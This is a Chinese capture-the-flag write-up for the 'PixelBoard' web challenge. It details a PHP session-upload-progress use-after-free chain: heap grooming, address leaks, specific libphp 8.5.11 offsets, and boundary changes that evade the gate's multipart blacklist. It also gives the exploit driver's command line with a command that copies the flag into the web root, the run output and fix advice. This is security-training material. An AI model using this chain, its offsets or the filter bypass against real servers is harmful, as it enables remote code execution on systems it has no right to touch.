# PixelBoard — 团队图片看板

```
> TPCTF 2026 · web · 挑战 ID `AUTHORED-7D1024E9` · 状态 solved
```

## 一句话

PixelBoard 是一个轻量的团队图片看板，摄影组用它同步作品集和拍摄排期。

## 附件

| 文件 | 大小 | sha256 |
| --- | --- | --- |
| `src/README.txt` | 701 B | `6e138260bc0f…` |
| `src/README.md` | 674 B | `a2f6051cd515…` |
| `src/gate.py` | 5.5 KB | `bc1ffad0a031…` |
| `src/index.html` | 443 B | `8e3d7dcc1eb7…` |
| `src/Dockerfile.txt` | 518 B | `2dc61fb32854…` |
| `src/docker-compose.txt` | 2.3 KB | `e503fc85d0a1…` |
| `src/entrypoint.sh.txt` | 399 B | `ca3149228bd8…` |

## 分析与利用

FLAG：«FLAG»

分值：动态计分

### 题面与附件

• 类别：web，difficulty hard
• 目标：取得平台下发到容器 /answers/flag 的 «FLAG»
• 入口：http://{{INSTANCE_HOST}}:8080/（经 gate 转发到 app:80）
• 关键附件：app/conf/zz-app.ini、app/conf/mpm_prefork.conf、app/conf/srv.conf、app/entrypoint.sh.txt、app/site/index.php、docker-compose.txt、gate/gate.py

应用本身没有上传、文件操作或 include，index.php 只渲染 4 条静态 shots；漏洞来自 PHP 引擎与配置。

### 环境与源码审计

• 镜像：php:8.5.11-apache，Debian 13 trixie，Apache 2.4.69，mod_php。
• zz-app.ini：

```
memory_limit=16M
post_max_size=32M
upload_max_filesize=32M
session.save_path=/tmp
session.use_strict_mode=0
session.use_cookies=1
session.upload_progress.enabled=On
session.upload_progress.cleanup=On
expose_php=0
```

• mpm_prefork.conf：

StartServers 1

MinSpareServers 1

MaxSpareServers 1

MaxRequestWorkers 1

ServerLimit 1

MaxConnectionsPerChild 0

只有一个 Apache worker，跨请求 stale state 不会被其他 worker 稀释。

• entrypoint.sh.txt：从 /run/gate-secret/value 读取 secret，给 Apache 增加

SetEnvIf X-Gate "^<secret>$" gate_ok

并把 Require all granted 改成 Require env gate_ok。

• docker-compose.txt：flag-rotator 把平台 flag 写到 /out/flag；app 将 answers 卷的 flag 子路径挂到 /answers/flag（只读）；Dockerfile 里 ln -sfn /answers/flag /flag。

### 漏洞：CVE-2026-109618（php2shell）

利用 session.upload_progress 在 RINIT 之前初始化 session 的行为：

1. 超大 multipart/form-data 触发 OOM/bailout，session 的 PS(id)、PS(http_session_vars) 等指针悬挂。
2. 下一个请求复用同一 worker，用精心布置的 POST 字段覆盖这些悬挂指针。
3. 通过 Set-Cookie 泄漏 Zend MM chunk 基址和 libphp 基址。
4. 最后伪造 zend_reference → fake HashTable，把 pDestructor 指向 zif_system，执行 14 字节以内的命令。

本靶的 memory_limit=16M，因此 PoC 使用 --huge-mb 10（约 10MB 的 OOM 字段）。

**8.5.11 偏移**

从本地 libphp-8.5.11.so 读取并验证：

| 符号 | 偏移 |
| --- | --- |
| zif_system | 0x5996e0 |
| zval_ptr_dtor | 0x7b47a0 |
| htdata | 0x6a0d8 |

htdata 对应 96B carrier 方案：POST 值落在 128B 块，data 在块 +24，在 value+0x48 写 fake zend_reference。官方 15B bin-40 carrier 在 8.5.11 上不成立，因为 PS(http_session_vars) 指向的是 32B 的悬挂 zend_reference。

### 本地复现

用题目配置构建了 pixelboard-lab 镜像并运行 pblab：

docker build -f Dockerfile.lab -t pixelboard-lab .

docker run -d --name pblab -p 127.0.0.1:18090:80 pixelboard-lab

本地 /answers/flag 写入测试值 «FLAG»。

适配后的驱动是 pb_exploit.py，相对 papertrail 版本的主要改动：

• PAPERSESS → PHPSESSID
• htdata_offset=0x6A0D8（pb_exploit.py:87）
• 新增 _stage3_pb()（pb_exploit.py:550-583）：A 请求 64 字节 session 值 + 6 个 pad + 10MB OOM 字段；B 请求 96 字节 carrier，+0x48 写 struct.pack("<IIQQ", 1, 0x1A, htd, 0x307)，再用 15 个字段放 fake HashTable。
• 新增 --gate：先 GET /handshake，后续 POST 带 X-Panel: pixelboard 和 X-Handshake: <token>。
• dbg 默认关闭（pb_exploit.py:197），只有显式开启才在 URL 后追加 ?dbg=N。

本地完整链：

[+] chunk base = 0x7d317da00000

[+] libphp base = 0x7d317f600000

PROOF: «FLAG»

### gate 适配

gate/gate.py 的约束：

• 状态改变请求（POST/PUT/PATCH/DELETE）必须同时带 X-Panel: pixelboard 和正确的 X-Handshake。
• 拒绝 Transfer-Encoding，必须有 Content-Length，body 最大 16 MiB。
• multipart 最多 1200 个 part；blacklist 为：

```
BANNED_BOUNDARIES = {b"BBBBBBBBBB", b"BNDRY12345", b"S" * 17}
```

• gate.py:88 会先 strip() boundary，尾随空格无法绕过计数。

因此把 PoC 的 boundary 改成同长度但不在黑名单的值：

• S*17 → X*17
• B*10 → C*10
• BNDRY12345 → YNDRY12345

本驱动每个请求约 1005 个 part，body 最大约 13.5MB，均在 gate 限制内。

### 关键调试：dbg 查询串破坏了堆布局

最初每个请求都会把路径改成 /index.php?dbg=N，方便对照 Apache 日志。结果：

• 本地 stage2 连续 20 次 lib=0；
• docker logs pblab 显示 stage2 B 请求没有 access log，子进程直接 Segmentation fault (11) / Abort (6)，并出现 zend_mm_heap corrupted；
• 远程 stage2 经 gate 返回 502 upstream unavailable。

原因：stage2 要把 56B 的 HashTable 精确放进目标槽位，?dbg=N 改变了请求 URI、环境变量和 $_SERVER 的分配序列，导致堆布局偏移。

把 Target.dbg 默认设为 False、不再追加查询串之后：

• 本地 stage2 重测 20 次成功 3 次；
• 远程 stage1/stage2 一次成功。

stage2 本身是概率性的（约 15%），所以使用 --retries 3。

### 远程利用

```
MSYS_NO_PATHCONV=1 python pb_exploit.py \
```

-u http://{{INSTANCE_HOST}}:8080/index.php \

-c 'cat</flag>/s/x' --proof-file '' --fetch /x \

--huge-mb 10 \

--zif-offset 0x5996e0 --dtor-offset 0x7b47a0 --htdata-offset 0x6a0d8 \

--offsets-file none --no-auto-offsets \

--timeout 180 --retries 3 --gate

实际输出：

[*] gate handshake status=200

[+] chunk base = 0x711bd7a00000

[+] libphp base = 0x711bd4400000

[*] stage 3: HTDATA=0x711bd7a6a0d8 ZIF=0x711bd49996e0

[*] stage3 B resp len=180 tail=b'HTTP/1.1 502 Bad Gateway ... upstream unavailable\n'

[+] W3 attempt 1

PROOF: «FLAG»

stage3 的 B 请求经 gate 返回 502，是因为 app 在 UAF 后、发送状态行之前崩溃；但命令 cat</flag>/s/x 已经执行，flag 已写入 /s/x。gate 把上游的崩溃转成了 502，不影响写入结果。

直接确认：

```python
python - <<'PY'
import urllib.request
print(urllib.request.urlopen('http://{{INSTANCE_HOST}}:8080/x', timeout=20).read().decode())
```

PY

输出：

«FLAG»

### 提交

POST /api/v1/submissions

Content-Type: application/json

```
{"instance_id":"83e58a33-6c93-48d4-9fbb-5b7366a3e50e",
```

"question_id":"flag",

```
"answer":"«FLAG»"}
```

返回：

```
{"correct":true,"solve_time_s":2326.5,"solve_rank":42,
"question_id":"flag","challenge_fully_solved":true,"ranked":true}
```

### 结果

«FLAG»

### 修复建议

• 升级到已修复的 PHP 版本（8.5.11 之后）。
• 不需要上传功能时关闭 session.upload_progress.enabled。
• 不要让不可信的 multipart 请求在单 worker、低 memory_limit 的进程里触发 OOM；限制请求体大小并隔离 worker。

## 结果

- flag sha256：`001cda5418af7cf8a8bd634b59db0a0f39a5a65c15c802ab19478b3dce5a648a`, `1716cf69dbeae554ba1e73e63515ff96b18e994469ac9fb0a2bd3140bef9d828`, `9e145700802aad16f2fa81849d6c06d789b8dea05e88cce403ac1011651fd9cb`
- 明文 flag 不入库；提交记录见 `.ctf-submissions.jsonl` 或原始 WP。

## 脚本

- `solve/pb_exploit.py`

## 待核实

- 本条目由 WP 第 13 节《PixelBoard — 团队图片看板》与平台附件自动合成，建议人工复核 summary 与 fingerprints。
